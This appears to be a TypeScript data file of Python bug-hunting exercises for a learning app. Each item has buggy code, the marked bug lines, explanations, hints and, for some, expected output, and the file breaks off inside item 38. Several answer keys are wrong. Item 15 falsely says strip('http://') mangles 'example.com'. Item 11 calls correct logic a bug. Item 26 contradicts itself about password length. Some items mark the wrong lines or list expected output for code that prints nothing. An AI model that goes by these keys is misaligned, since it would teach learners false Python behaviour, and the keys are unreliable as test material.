import type { Problem } from '@/types';

export const problems: Problem[] = [
  // ==================== EASY PROBLEMS (1-50) ====================
{
    id: 1,
    title: "The Age Display Bug",
    difficulty: "easy",
    category: "type",
    type: "find",
    description: "You are building a user profile page for a social media app that has millions of daily active users. The greet_user function is supposed to display a personalized greeting with the user's age, but it is crashing in production when users view profiles. The error logs show a TypeError occurring on line 2. This bug is affecting user experience across the entire platform. Find the bug that is causing user profile pages to fail and explain why Python cannot concatenate these data types directly.",
    code: `def greet_user(name, age):
    return "Hello " + name + ", you are " + age + " years old"

print(greet_user("Alice", 25))`,
    bugLines: [2],
    bugExplanations: {
      2: "In production environments, user data often comes from databases where age is stored as an INTEGER type. Python cannot concatenate strings with integers directly using the + operator because they are different data types. This bug would crash your user profile page for every single user. The fix is to use f-strings (f'Hello {name}, you are {age} years old') which automatically handles type conversion, or use explicit conversion with str(age)."
    },
    hint: "Python is strongly typed - you cannot concatenate a string with an integer. Consider what data type 'age' is when passed as 25 versus '25'.",
    hasBugs: true
  },
{
    id: 2,
    title: "The Game Board Corruption",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "You are developing a tic-tac-toe game for a mobile app. When a player makes a move on the board, suddenly ALL rows in the board show the same move. Players are complaining that the game is completely broken. This is a classic Python gotcha that has bitten many developers building grid-based games, spreadsheets, matrix operations, or any 2D data structures. The issue is that all rows are references to the same list object in memory.",
    code: `def create_matrix(rows, cols):
    row = [0] * cols
    return [row] * rows

matrix = create_matrix(3, 3)
matrix[0][0] = 1
print(matrix)`,
    bugLines: [2, 3],
    bugExplanations: {
      2: "When you do [row] * rows, you are not creating 3 separate rows - you are creating 3 references to the SAME row object in memory. This is because Python lists store references, not copies.",
      3: "When you modify matrix[0][0], you are modifying the shared row object, so all rows appear to change simultaneously. The fix is to use a list comprehension to create independent rows: [[0 for _ in range(cols)] for _ in range(rows)]"
    },
    hint: "Think about what happens when you multiply a list containing an object reference. Does Python create copies or just more references?",
    fixedCode: `def create_matrix(rows, cols):
    return [[0 for _ in range(cols)] for _ in range(rows)]

matrix = create_matrix(3, 3)
matrix[0][0] = 1
print(matrix)`,
    expectedOutput: "[[1, 0, 0], [0, 0, 0], [0, 0, 0]]",
    hasBugs: true
  },
{
    id: 3,
    title: "The Shopping Cart Nightmare",
    difficulty: "easy",
    category: "pitfall",
    type: "find",
    description: "You are building an e-commerce site with millions of customers. Customers are reporting that items they add to their cart are appearing in OTHER customers' carts! This is a serious data leak bug that could expose private shopping information between users. The add_to_cart function uses a default argument that seems harmless. Find why this is causing cross-contamination between user sessions and understand when default arguments are evaluated in Python.",
    code: `def add_to_cart(item, cart=[]):
    cart.append(item)
    return cart

# Customer A adds items
print(add_to_cart("laptop"))
print(add_to_cart("mouse"))

# Customer B starts with an empty cart - or do they?
print(add_to_cart("phone"))`,
    bugLines: [1],
    bugExplanations: {
      1: "Default arguments in Python are evaluated ONCE when the function is defined, not each time the function is called. The empty list [] is created once at function definition time and shared across ALL function calls. This means Customer B sees Customer A's items in their cart! The fix is to use cart=None as the default and initialize the list inside the function body."
    },
    hint: "When are default arguments evaluated in Python - at definition time or at call time?",
    hasBugs: true
  },
{
    id: 4,
    title: "The Grade Calculator Error",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "A school's grading system is giving students incorrect grade averages, potentially affecting their academic records and college admissions. A student with scores of 5 and 2 should get 3.5, but the system is returning 3. This is affecting student transcripts and causing complaints from parents and teachers. The bug is in how Python handles division operators. Understand the difference between floor division and true division.",
    code: `def calculate_average(score1, score2):
    return (score1 + score2) // 2

# Student with scores 5 and 2
print(calculate_average(5, 2))  # Expected: 3.5, Actual: 3`,
    bugLines: [2],
    bugExplanations: {
      2: "The // operator is floor division which truncates (cuts off) the decimal part and returns an integer. For grade calculations where precision matters, you need true division with / which returns a float. This bug has caused students to receive lower grades than they actually earned!"
    },
    hint: "Python has two division operators: / and //. What is the difference between them and when should you use each?",
    fixedCode: `def calculate_average(score1, score2):
    return (score1 + score2) / 2

print(calculate_average(5, 2))`,
    expectedOutput: "3.5",
    hasBugs: true
  },
{
    id: 5,
    title: "The Username Formatter Crash",
    difficulty: "easy",
    category: "type",
    type: "find",
    description: "Your user registration system needs to capitalize the first letter of usernames for display purposes. A junior developer tried to modify the string in-place, but it is throwing a TypeError that is crashing the registration flow. Strings are immutable in Python, meaning they cannot be changed after creation. Find where the code is trying to modify a string directly and understand why this operation is not allowed.",
    code: `def format_username(username):
    # Capitalize first letter
    username[0] = username[0].upper()
    return username

print(format_username("john_doe"))`,
    bugLines: [3],
    bugExplanations: {
      3: "Strings are immutable in Python - you cannot change individual characters by assignment. This code throws: TypeError: 'str' object does not support item assignment. The fix is to create a new string: username = username[0].upper() + username[1:] or simply use the built-in .capitalize() method which returns a new string."
    },
    hint: "Can you change a string character by index in Python? What does 'immutable' mean?",
    hasBugs: true
  },
{
    id: 6,
    title: "The Square Number Validator",
    difficulty: "easy",
    category: "algorithm",
    type: "find",
    description: "Your math tutoring app needs to check if a number is a perfect square (like 16, 25, 36, 49). A junior developer wrote this validation function. Read it carefully - is there actually a bug, or is this code production-ready? This is a trick question to test your code review skills. Analyze the logic: it takes the square root, converts to int, squares it back, and checks if it equals the original.",
    code: `import math

def is_perfect_square(n):
    if n < 0:
        return False
    root = int(math.sqrt(n))
    return root * root == n

# Test cases
print(is_perfect_square(16))   # True
print(is_perfect_square(14))   # False
print(is_perfect_square(25))   # True
print(is_perfect_square(-4))   # False`,
    bugLines: [],
    bugExplanations: {},
    hint: "Sometimes code is correct! Test your assumptions. Does this correctly handle all edge cases including negative numbers?",
    hasBugs: false
  },
{
    id: 7,
    title: "The Missing User Handler",
    difficulty: "easy",
    category: "edge-case",
    type: "fix",
    description: "Your API endpoint for fetching user profiles is crashing with KeyError when a user searches for a non-existent username. This is causing 500 Internal Server Error responses in production instead of graceful 404 responses. The error is affecting your API reliability metrics and user experience. Fix the error handling to gracefully handle missing users.",
    code: `def get_user_profile(users_db, username):
    user = users_db[username]
    return f"Profile: {user['name']}, Age: {user['age']}"

users = {"alice": {"name": "Alice", "age": 25}}
print(get_user_profile(users, "bob"))`,
    bugLines: [2],
    bugExplanations: {
      2: "Using dict[key] with square brackets raises KeyError if the key doesn't exist. In production APIs, this causes 500 Internal Server Error responses which look bad in logs and monitoring. Use the .get() method which returns None if the key is not found, allowing you to handle missing data gracefully with proper error messages."
    },
    hint: "Dictionaries have a safer method for key access that doesn't raise exceptions. What does dict.get() return if the key is missing?",
    fixedCode: `def get_user_profile(users_db, username):
    user = users_db.get(username)
    if user is None:
        return "User not found"
    return f"Profile: {user['name']}, Age: {user['age']}"

users = {"alice": {"name": "Alice", "age": 25}}
print(get_user_profile(users, "bob"))`,
    expectedOutput: "User not found",
    hasBugs: true
  },
{
    id: 8,
    title: "The Off-By-One Report Generator",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your monthly report generator is supposed to print daily summaries for days 1 through 31, but it is only printing days 1 through 30. The last day of every month is missing from reports! This is a classic off-by-one error that affects many loop implementations. The bug is in how the range function works in Python.",
    code: `def generate_daily_report(days_in_month):
    for day in range(1, days_in_month):
        print(f"Processing day {day}...")
    print("Report complete!")

# Process all days in the month
generate_daily_report(31)`,
    bugLines: [2],
    bugExplanations: {
      2: "range(1, n) generates numbers from 1 to n-1, NOT 1 to n. The end value is exclusive, not inclusive. For a 31-day month, range(1, 31) only gives 1-30, missing the last day! Use range(1, days_in_month + 1) to include the last day."
    },
    hint: "range() stops BEFORE the end value, not AT the end value. How can you include day 31?",
    hasBugs: true
  },
{
    id: 9,
    title: "The None Check Trap",
    difficulty: "easy",
    category: "pitfall",
    type: "find",
    description: "Your authentication system checks if a user session is valid by comparing to None. However, a security audit flagged this comparison as potentially dangerous. Find the issue with using == for None checks and understand why 'is' is preferred in Python for identity comparison.",
    code: `def is_session_valid(session):
    if session == None:
        return False
    return True

# This works, but there's a better way
print(is_session_valid(None))`,
    bugLines: [2],
    bugExplanations: {
      2: "Using == for None comparison is risky because classes can override __eq__ to return True for None comparisons. Use 'is' instead: 'if session is None'. The 'is' operator checks object identity (same memory location), not equality, and is the Pythonic way to check for None. None is a singleton in Python."
    },
    hint: "What is the difference between '==' and 'is' in Python? Which one checks for identity versus equality?",
    hasBugs: true
  },
{
    id: 10,
    title: "The Empty List Crash",
    difficulty: "easy",
    category: "edge-case",
    type: "fix",
    description: "Your analytics dashboard shows the most recent transaction for a user. But when a new user with no transactions views their dashboard, the app crashes with an IndexError. This is causing poor first-time user experience. Handle the empty list case gracefully.",
    code: `def get_latest_transaction(transactions):
    return transactions[len(transactions) - 1]

# New user with no transactions
print(get_latest_transaction([]))`,
    bugLines: [2],
    bugExplanations: {
      2: "Accessing index len(list)-1 on an empty list causes IndexError because there are no valid indices. While you could use negative indexing (transactions[-1]) which is more Pythonic, it still crashes on empty lists. The best solution is to check if the list is empty first and return None or a default message."
    },
    hint: "What happens when you access an index that doesn't exist? How can you check if a list is empty in Python?",
    fixedCode: `def get_latest_transaction(transactions):
    if not transactions:
        return None
    return transactions[-1]

print(get_latest_transaction([]))`,
    expectedOutput: "None",
    hasBugs: true
  },
{
    id: 11,
    title: "The Nightclub Entry Logic",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your venue entry system has complex rules: patrons must be 21+ OR have a valid ID and be 18+. But the current logic is letting underage patrons in! A 20-year-old with a fake ID is being allowed entry when they should be denied. The bug is in operator precedence - understand how Python evaluates boolean expressions.",
    code: `def can_enter_venue(age, has_valid_id):
    # Must be 21+, OR (have ID AND be 18+)
    if age >= 21 or has_valid_id and age >= 18:
        return True
    return False

# Test: 20-year-old with valid ID
print(can_enter_venue(20, True))`,
    bugLines: [3],
    bugExplanations: {
      3: "Operator precedence: 'and' binds tighter than 'or'. The expression evaluates as: age >= 21 OR (has_valid_id AND age >= 18). A 20-year-old with an ID passes because the second condition is True! Use parentheses to make the logic explicit: (age >= 21) or (has_valid_id and age >= 18)"
    },
    hint: "Check the operator precedence in the condition. Does 'and' or 'or' get evaluated first?",
    hasBugs: true
  },
{
    id: 12,
    title: "The Silent Calculator",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your calculator app's add function is returning None instead of the sum. Users are complaining that basic addition is not working. The developer calculated the result but forgot something crucial at the end of the function. This is a common beginner mistake.",
    code: `def add_numbers(a, b):
    result = a + b

print(add_numbers(2, 3))`,
    bugLines: [3],
    bugExplanations: {
      3: "Functions without an explicit return statement return None by default. The calculation happens (a + b is computed) but the result is never returned to the caller! Add 'return result' to fix this very common beginner mistake."
    },
    hint: "What does a function return if there is no return statement?",
    hasBugs: true
  },
{
    id: 13,
    title: "The Slow Duplicate Finder",
    difficulty: "easy",
    category: "performance",
    type: "find",
    description: "Your data validation system checks for duplicate IDs in a list of 100,000 records. It is taking minutes to complete when it should take milliseconds! The algorithm is O(n²) when it could be O(n). Find the performance bottleneck and understand why list lookup is slow.",
    code: `def has_duplicates(ids):
    seen = []
    for id in ids:
        if id in seen:
            return True
        seen.append(id)
    return False`,
    bugLines: [4],
    bugExplanations: {
      4: "The 'in' operator on a list is O(n) - it scans the entire list linearly. For 100,000 items, this becomes O(n²) overall complexity. Use a set for O(1) lookups: seen = set(). This single change can reduce runtime from minutes to milliseconds! Sets use hash tables for constant-time membership testing."
    },
    hint: "List lookup is linear time O(n). Is there a data structure with O(1) lookup time?",
    hasBugs: true
  },
{
    id: 14,
    title: "The Resource Leak",
    difficulty: "easy",
    category: "pitfall",
    type: "fix",
    description: "Your log analysis tool opens files but never closes them. After processing a few thousand log files, the system runs out of file descriptors and crashes. This is a classic resource leak bug that affects long-running processes. Files must be properly closed to free system resources.",
    code: `# Create a test file first
with open('/tmp/test.log', 'w') as f:
    f.write("Log entry 1\nLog entry 2")

def process_log_file(filename):
    f = open(filename, 'r')
    data = f.read()
    return data

print(process_log_file('/tmp/test.log'))`,
    bugLines: [7],
    bugExplanations: {
      7: "Files that aren't explicitly closed remain open, consuming system resources. On Unix systems, you can run out of file descriptors causing 'Too many open files' errors. Use the 'with' statement which automatically closes the file even if exceptions occur: with open(filename, 'r') as f:"
    },
    hint: "Files should be properly closed after use. What Python construct automatically handles cleanup?",
    fixedCode: `# Create a test file first
with open('/tmp/test.log', 'w') as f:
    f.write("Log entry 1\nLog entry 2")

def process_log_file(filename):
    with open(filename, 'r') as f:
        data = f.read()
    return data

print(process_log_file('/tmp/test.log'))`,
    expectedOutput: "Log entry 1\nLog entry 2",
    hasBugs: true
  },
{
    id: 15,
    title: "The URL Cleaner Confusion",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your URL sanitization function is supposed to remove 'http://' from URLs, but it is behaving strangely and mangling URLs. The developer misunderstood how strip() works. Find the bug and understand the difference between strip() and replace().",
    code: `def clean_url(url):
    # Remove http:// prefix
    return url.strip("http://")

print(clean_url("http://example.com"))`,
    bugLines: [3],
    bugExplanations: {
      3: "strip() removes CHARACTERS, not substrings! 'http://'.strip('http://') removes all h, t, t, p, :, / characters from BOTH ends of the string. It removed the trailing 'm' because 'm' is not in the strip set! Use replace() for substring removal: url.replace('http://', '') or use urllib.parse for proper URL handling."
    },
    hint: "strip() treats its argument as a SET of characters to remove from both ends, not as a substring.",
    hasBugs: true
  },
{
    id: 16,
    title: "The Infinite Countdown",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your rocket launch countdown timer is stuck in an infinite loop. The countdown never reaches 'Blast off!' and the program hangs, consuming 100% CPU. The loop condition is always true because the loop variable is never updated. Find the missing piece.",
    code: `def countdown(start):
    n = start
    while n > 0:
        print(f"T-minus {n}...")
    print("Blast off!")

countdown(5)`,
    bugLines: [5],
    bugExplanations: {
      5: "The loop variable n is never decremented, so n > 0 is always True. This creates an infinite loop that prints 'T-minus 5...' forever. Add 'n -= 1' to decrement the counter each iteration so the loop eventually terminates."
    },
    hint: "What changes the loop condition? Without updating n, the while loop will run forever.",
    fixedCode: `def countdown(start):
    n = start
    while n > 0:
        print(f"T-minus {n}...")
        n -= 1
    print("Blast off!")

countdown(5)`,
    expectedOutput: "T-minus 5...\nT-minus 4...\nT-minus 3...\nT-minus 2...\nT-minus 1...\nBlast off!",
    hasBugs: true
  },
{
    id: 17,
    title: "The Immutable Point",
    difficulty: "easy",
    category: "type",
    type: "find",
    description: "Your geometry library needs to update coordinates, but tuples are immutable. The developer tried to modify a tuple element directly, causing a TypeError. Find where this happens and understand why tuples cannot be modified after creation.",
    code: `def move_point(point, delta_x):
    # Try to move the point
    point[0] = point[0] + delta_x
    return point

p = (10, 20)
print(move_point(p, 5))`,
    bugLines: [3],
    bugExplanations: {
      3: "Tuples are immutable - you cannot change their elements after creation. This code raises TypeError: 'tuple' object does not support item assignment. Return a new tuple instead: return (point[0] + delta_x, point[1]) or use a list if you need mutability."
    },
    hint: "Tuples cannot be modified after creation. What should you do instead of modifying in-place?",
    hasBugs: true
  },
{
    id: 18,
    title: "The Dictionary Iteration Cleanup",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your configuration printer iterates over a dictionary but looks up values by key each time. This is inefficient and un-Pythonic. Clean up the iteration using the proper dictionary method.",
    code: `def print_config(config):
    for key in config:
        print(f"{key}: {config[key]}")  # Can be cleaner`,
    bugLines: [3],
    bugExplanations: {
      3: "Looking up config[key] in each iteration is unnecessary and un-Pythonic. Use .items() to get both key and value in one operation: for key, value in config.items():. This is more readable, more efficient, and follows Python best practices."
    },
    hint: "Dictionaries have a method for iterating over key-value pairs directly.",
    fixedCode: `def print_config(config):
    for key, value in config.items():
        print(f"{key}: {value}")`,
    expectedOutput: "debug: True\nport: 8080",
    hasBugs: true
  },
{
    id: 19,
    title: "The Exception Swallower",
    difficulty: "easy",
    category: "pitfall",
    type: "find",
    description: "Your error logging system catches all exceptions but does not properly report them. A bare 'except:' clause is catching KeyboardInterrupt (Ctrl+C), making your program unkillable! This is dangerous in production as it can prevent graceful shutdowns.",
    code: `def process_data(data):
    try:
        return int(data) / 2
    except:
        return None`,
    bugLines: [4],
    bugExplanations: {
      4: "Bare 'except:' catches BaseException, including KeyboardInterrupt, SystemExit, and GeneratorExit. This makes your program unkillable with Ctrl+C! Always catch specific exceptions: 'except ValueError:' or at minimum 'except Exception:' to avoid catching system-exiting exceptions."
    },
    hint: "Bare except clauses are dangerous. What exceptions should you catch specifically?",
    hasBugs: true
  },
{
    id: 20,
    title: "The List Mutator Side Effect",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "Your data processing pipeline removes the first element from a list, but it is unexpectedly modifying the original data! Other parts of the system are seeing corrupted data because the original list was mutated. Fix the side effect by avoiding mutation of the input.",
    code: `def remove_first_item(items):
    items.pop(0)
    return items

original = [1, 2, 3, 4]
result = remove_first_item(original)
print(f"Original: {original}")`,
    bugLines: [2],
    bugExplanations: {
      2: "Lists are passed by reference in Python. pop(0) modifies the original list, causing side effects that can break other parts of your code. Make a copy first: items = items.copy(), then modify the copy. This prevents unintended mutations of shared data."
    },
    hint: "Passing a list passes a reference, not a copy. How can you avoid modifying the original?",
    fixedCode: `def remove_first_item(items):
    items = items.copy()
    items.pop(0)
    return items

original = [1, 2, 3, 4]
result = remove_first_item(original)
print(f"Original: {original}")`,
    expectedOutput: "Original: [1, 2, 3, 4]",
    hasBugs: true
  },
{
    id: 21,
    title: "The Range Direction Bug",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your countdown timer is supposed to print numbers from 10 down to 1, but nothing prints at all. The range is constructed incorrectly for descending order because the default step is positive.",
    code: `for i in range(10, 0):
    print(i)

print("Done!")`,
    bugLines: [1],
    bugExplanations: {
      1: "range(10, 0) is empty because the default step is +1. You cannot go from 10 to 0 with a positive step. To count down, you need range(10, 0, -1) with a negative step. This is a common mistake when creating reverse ranges."
    },
    hint: "range() defaults to step=1, which won't go from 10 to 0. What step do you need for descending order?",
    hasBugs: true
  },
{
    id: 22,
    title: "The Pythonic Index Finder",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your search function finds the index of an item in a list, but it is using the old C-style loop pattern with range(len()). Make it more Pythonic using enumerate() which is the preferred Python idiom.",
    code: `def find_index(items, target):
    for i in range(len(items)):
        if items[i] == target:
            return i
    return -1`,
    bugLines: [2, 3],
    bugExplanations: {
      2: "Using range(len(items)) and indexing is un-Pythonic and harder to read.",
      3: "Use enumerate() which gives both index and value: for i, item in enumerate(items):. This is more readable, more Pythonic, and generally preferred in Python code."
    },
    hint: "enumerate() gives both index and value in one elegant loop.",
    fixedCode: `def find_index(items, target):
    for i, item in enumerate(items):
        if item == target:
            return i
    return -1`,
    expectedOutput: "1",
    hasBugs: true
  },
{
    id: 23,
    title: "The Silent Division Bug",
    difficulty: "easy",
    category: "edge-case",
    type: "find",
    description: "Your calculator returns 0 when dividing by zero, but this masks real errors. A division by zero in financial calculations should be an error, not silently return 0. This can cause silent data corruption in production systems.",
    code: `def safe_divide(a, b):
    if b == 0:
        return 0
    return a / b

result = safe_divide(100, 0)`,
    bugLines: [2, 3],
    bugExplanations: {
      2: "Returning 0 for division by zero masks the real problem and can cause incorrect calculations downstream.",
      3: "In production code, this can cause silent data corruption. Better to raise ValueError or return None to signal an error condition that calling code can handle appropriately."
    },
    hint: "Silently returning 0 for division by zero can cause logic errors downstream. What should you do instead?",
    hasBugs: true
  },
{
    id: 24,
    title: "The Built-in Shadow",
    difficulty: "easy",
    category: "syntax",
    type: "fix",
    description: "A developer named a variable 'list' which shadows Python's built-in list() function. Later code that tries to convert a tuple to a list fails mysteriously with a TypeError. Find the naming conflict and understand why shadowing built-ins is dangerous.",
    code: `list = [1, 2, 3]

def process(items):
    return list(items)

print(process((1, 2)))`,
    bugLines: [1],
    bugExplanations: {
      1: "Never use built-in names (list, dict, str, int, set, tuple, etc.) as variable names. This shadows the built-in and causes confusing errors later when you try to use the built-in function. Rename to something descriptive like 'my_list' or 'data_list'."
    },
    hint: "Variable names can shadow built-in functions. What are Python's built-in names you should avoid?",
    fixedCode: `my_list = [1, 2, 3]

def process(items):
    return list(items)

print(process((1, 2)))`,
    expectedOutput: "[1, 2]",
    hasBugs: true
  },
{
    id: 25,
    title: "The Join Type Error",
    difficulty: "easy",
    category: "type",
    type: "find",
    description: "Your CSV exporter tries to join numbers with commas, but it is failing with a TypeError. The join() method has strict type requirements - it only works with strings. Find the bug and understand how to convert numbers to strings.",
    code: `def format_numbers(numbers):
    return ", ".join(numbers)

print(format_numbers([1, 2, 3]))`,
    bugLines: [2],
    bugExplanations: {
      2: "str.join() requires an iterable of strings. It does NOT auto-convert numbers to strings. Use a generator expression: \", \".join(str(n) for n in numbers). This is a common mistake when working with CSV exports and string formatting."
    },
    hint: "join() only works with iterables of strings. How can you convert numbers to strings?",
    hasBugs: true
  },
{
    id: 26,
    title: "The Password Validator Bug",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your password validation system is supposed to check that passwords are at least 8 characters long. However, it is accepting passwords that are too short, creating a security vulnerability. The comparison operator is incorrect.",
    code: `def is_password_valid(password):
    # Check minimum password length
    if len(password) > 8:
        return True
    return False

print(is_password_valid("short"))  # Returns False - correct
print(is_password_valid("exactly8"))`,
    bugLines: [3],
    bugExplanations: {
      3: "The condition uses > (greater than) instead of >= (greater than or equal). A password of exactly 8 characters should be valid but is being rejected. The fix is to use >= 8 to include 8-character passwords."
    },
    hint: "Should an 8-character password be valid? Check your comparison operator.",
    hasBugs: true
  },
{
    id: 27,
    title: "The Temperature Converter",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your weather app's temperature converter from Celsius to Fahrenheit is giving incorrect results. The formula is being applied incorrectly due to operator precedence. The correct formula is (C * 9/5) + 32.",
    code: `def celsius_to_fahrenheit(celsius):
    # Formula: (C * 9/5) + 32
    return celsius * 9 / 5 + 32  # This is correct actually

# Wait, let me check...
print(celsius_to_fahrenheit(0))
print(celsius_to_fahrenheit(100))`,
    bugLines: [],
    bugExplanations: {},
    hint: "Actually, this code is correct! Multiplication and division have the same precedence and are evaluated left to right. Don't fix what isn't broken.",
    hasBugs: false
  },
{
    id: 28,
    title: "The Email Domain Extractor",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your user management system extracts the domain from email addresses. It works for most emails but fails when there are multiple @ symbols or when the email format is unusual. The split logic needs improvement.",
    code: `def get_domain(email):
    # Extract domain from email
    parts = email.split("@")
    return parts[1]  # Assumes exactly one @

print(get_domain("user@example.com"))  # Works
print(get_domain("user@@example.com"))`,
    bugLines: [3, 4],
    bugExplanations: {
      3: "split() with an email containing @@ creates a list with an empty string element.",
      4: "Accessing parts[1] when there might not be a valid domain causes IndexError. Should validate the split result or use partition() which is safer."
    },
    hint: "What happens if the email has multiple @ symbols or is malformed?",
    hasBugs: true
  },
{
    id: 29,
    title: "The List Reversal Confusion",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "Your data display function needs to show items in reverse order. The developer used reversed() but did not convert it to a list, causing issues when trying to iterate multiple times.",
    code: `def get_reversed(items):
    # Return reversed list
    return reversed(items)

result = get_reversed([1, 2, 3])
print(list(result))  # Works first time
print(list(result))  # Second iteration`,
    bugLines: [3],
    bugExplanations: {
      3: "reversed() returns an iterator, not a list. Iterators can only be traversed once. Convert to list: return list(reversed(items)) or use slicing: return items[::-1] which returns a new list directly."
    },
    hint: "reversed() returns an iterator, not a list. How can you get a list instead?",
    fixedCode: `def get_reversed(items):
    return list(reversed(items))

result = get_reversed([1, 2, 3])
print(list(result))
print(list(result))`,
    expectedOutput: "[3, 2, 1]\n[3, 2, 1]",
    hasBugs: true
  },
{
    id: 30,
    title: "The Case-Sensitive Search",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your product search function is case-sensitive, causing users to miss products when they search with different capitalization. Users searching for 'laptop' won't find products labeled 'Laptop'. Make the search case-insensitive.",
    code: `def search_products(products, query):
    results = []
    for product in products:
        if query in product:
            results.append(product)
    return results

products = ["Laptop", "LAPTOP Stand", "laptop bag"]
print(search_products(products, "laptop"))  # Only finds 1 item`,
    bugLines: [4],
    bugExplanations: {
      4: "The 'in' operator for strings is case-sensitive. Convert both strings to the same case: if query.lower() in product.lower():. This ensures 'laptop' matches 'Laptop', 'LAPTOP', etc."
    },
    hint: "String comparison in Python is case-sensitive. How can you make it case-insensitive?",
    hasBugs: true
  },
{
    id: 31,
    title: "The Modulo Misunderstanding",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your function checks if a number is even, but it is using the wrong comparison. The modulo operator returns the remainder, and the logic for checking even numbers is inverted.",
    code: `def is_even(n):
    return n % 2 == 1

print(is_even(4))
print(is_even(3))`,
    bugLines: [3],
    bugExplanations: {
      3: "n % 2 == 1 returns True for odd numbers (remainder 1), not even. Even numbers have remainder 0 when divided by 2. The fix is to use == 0: return n % 2 == 0."
    },
    hint: "What is the remainder when an even number is divided by 2?",
    hasBugs: true
  },
{
    id: 32,
    title: "The Float Comparison Trap",
    difficulty: "easy",
    category: "pitfall",
    type: "fix",
    description: "Your financial system compares floating point numbers for equality, but due to floating point precision issues, the comparison fails unexpectedly. This is a classic computer science problem with IEEE 754 floating point representation.",
    code: `def compare_prices(price1, price2):
    # Check if prices are equal
    return price1 == price2

# Due to floating point precision
print(compare_prices(0.1 + 0.2, 0.3))`,
    bugLines: [3],
    bugExplanations: {
      3: "Floating point numbers have precision issues. 0.1 + 0.2 is actually 0.30000000000000004, not exactly 0.3. Never compare floats with ==. Use math.isclose() or compare with a tolerance: abs(a - b) < epsilon."
    },
    hint: "Floating point arithmetic has precision issues. How should you compare floats?",
    fixedCode: `import math

def compare_prices(price1, price2):
    return math.isclose(price1, price2)

print(compare_prices(0.1 + 0.2, 0.3))`,
    expectedOutput: "True",
    hasBugs: true
  },
{
    id: 33,
    title: "The Missing Return in Loop",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your search function should return the first matching item, but it is returning None even when matches exist. The return statement is inside the loop conditionally, but there is no final return for when no match is found.",
    code: `def find_first_match(items, predicate):
    for item in items:
        if predicate(item):
            return item

result = find_first_match([1, 2, 3], lambda x: x > 1)
print(result)  # Returns 2 - works`,
    bugLines: [],
    bugExplanations: {},
    hint: "Actually, this code works correctly! When a match is found, it returns. If no match, Python implicitly returns None. This is often the desired behavior.",
    hasBugs: false
  },
{
    id: 34,
    title: "The Dictionary KeyError",
    difficulty: "easy",
    category: "edge-case",
    type: "fix",
    description: "Your configuration reader crashes when a configuration key is missing. It should provide a default value instead of raising KeyError. Use the dictionary method that provides a default.",
    code: `def get_config_value(config, key):
    return config[key]

config = {"debug": True}
print(get_config_value(config, "port"))`,
    bugLines: [3],
    bugExplanations: {
      3: "Using dict[key] raises KeyError for missing keys. Use dict.get(key, default) to provide a fallback value: return config.get(key, 8080). This is much safer for configuration reading."
    },
    hint: "Dictionaries have a get() method that can provide a default value.",
    fixedCode: `def get_config_value(config, key):
    return config.get(key, 8080)

config = {"debug": True}
print(get_config_value(config, "port"))`,
    expectedOutput: "8080",
    hasBugs: true
  },
{
    id: 35,
    title: "The String Split Surprise",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your CSV parser splits lines by commas, but it is including empty strings when there are consecutive commas or trailing commas. This is causing parsing errors downstream.",
    code: `def parse_csv_line(line):
    return line.split(",")

# Empty strings appear in results
print(parse_csv_line("a,b,,d"))  # ['a', 'b', '', 'd']`,
    bugLines: [],
    bugExplanations: {},
    hint: "This is actually correct behavior for split(). Empty fields in CSV are represented as empty strings. You may want to filter them out if needed.",
    hasBugs: false
  },
{
    id: 36,
    title: "The Infinite Recursion",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your factorial function has an infinite recursion bug. It never reaches the base case because the recursive call does not reduce the problem size. This causes a RecursionError.",
    code: `def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n)

print(factorial(5))`,
    bugLines: [4],
    bugExplanations: {
      4: "The recursive call should be factorial(n - 1), not factorial(n). Without decreasing n, the function calls itself forever with the same value, eventually hitting Python's recursion limit and raising RecursionError."
    },
    hint: "Recursive functions must move toward a base case. Is n getting smaller?",
    fixedCode: `def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n - 1)

print(factorial(5))`,
    expectedOutput: "120",
    hasBugs: true
  },
{
    id: 37,
    title: "The Truthiness Confusion",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your validation function checks if a value is provided, but it is treating 0 and empty string as 'not provided' due to Python's truthiness rules. This causes valid inputs to be rejected.",
    code: `def validate_required(value):
    if not value:
        return "Value is required"
    return "Valid"

print(validate_required(0))
print(validate_required(""))      # Correctly rejects
print(validate_required(None))    # Correctly rejects`,
    bugLines: [2],
    bugExplanations: {
      2: "0, empty string, empty list, and False are all 'falsy' in Python. The function wrongly rejects 0 as invalid when it might be a legitimate value. Use 'is None' to specifically check for None: if value is None:."
    },
    hint: "In Python, 0 and empty strings are 'falsy'. How can you specifically check for None?",
    hasBugs: true
  },
{
    id: 38,
    title: "The List Multiplication Bug",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "Your initialization code creates a list of empty lists, but all sublists are references to the same list. Modifying one modifies all, causing data corruption.",
    code: `def create_grid(size):
    # Create size x size grid
    return [[0] * size] * size

grid = create_grid(3)
grid[0][0] = 1
print(grid)`,
    bugLines: [3],
    bugExplanations: {
      3: "Multiplying a list containing a list creates multiple references to the SAME inner list. Use a list comprehension to create independent lists: [[0 for _ in range(size)] for _ in range(size)]."
    },
    hint: "[list] * n creates references, not copies. How can you create independent lists?",
    fixedCode: `def create_grid(size):
    return [[0 for _ in range(size)] for _ in range(size)]

grid = create_grid(3)
grid[0][0] = 1
print(grid)`,
    expectedOutput: "[[1, 0, 0], [0, 0, 0], [0, 0, 0]]",
